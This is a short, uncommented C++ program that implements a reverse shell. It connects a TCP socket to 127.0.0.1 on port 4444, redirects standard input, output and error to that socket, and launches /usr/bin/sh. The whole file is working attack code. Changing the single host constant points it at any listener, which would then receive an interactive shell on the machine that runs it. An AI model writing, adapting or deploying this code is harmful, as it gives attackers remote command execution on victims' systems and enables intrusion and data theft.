#include <iostream>
#include <cstdlib>
#include <cstring>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>

#define HOST_ADDR "127.0.0.1"

int main() {
    int sock_u;
    int connc_server;
    struct sockaddr_in r_server;

    sock_u = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_u < 0) {
        std::cerr << "Error creating socket" << std::endl;
        return EXIT_FAILURE;
    }

    r_server.sin_family = AF_INET;
    r_server.sin_port = htons(4444);
    r_server.sin_addr.s_addr = inet_addr(HOST_ADDR);
    memset(&(r_server.sin_zero), '\0', 8);  // Zero the rest of the struct

    connc_server = connect(sock_u, (struct sockaddr *)&r_server, sizeof(r_server));
    if (connc_server == 0) {
        dup2(sock_u, 0);
        dup2(sock_u, 1);
        dup2(sock_u, 2);
        char *const args[] = {"/usr/bin/sh", nullptr};
        execve(args[0], args, nullptr);
    } else {
        std::cerr << "\n\n\tError" << std::endl;
        close(sock_u);
    }

    return 0;
}
